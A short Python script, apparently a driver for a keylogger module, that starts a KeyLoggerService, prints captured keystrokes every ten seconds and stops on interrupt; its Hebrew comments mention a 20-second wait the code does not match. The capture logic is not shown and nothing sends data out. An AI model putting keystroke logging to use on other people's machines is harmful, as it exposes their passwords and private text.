import time
from key_logger_service import KeyLoggerService

def main():
    key_logger = KeyLoggerService()
    key_logger.start_logging()

    try:
        while True:
            time.sleep(10)
            # מחכה 20 שניות
            logged_keys = key_logger.get_logged_keys()  # מקבל את המידע שנאסף
            print("Logged keys so far:", logged_keys)

    except KeyboardInterrupt:
        print("\nStopping key logger...")
        key_logger.stop_logging()
        print("Final logged keys:", key_logger.get_logged_keys())

if __name__ == "__main__":
    main()
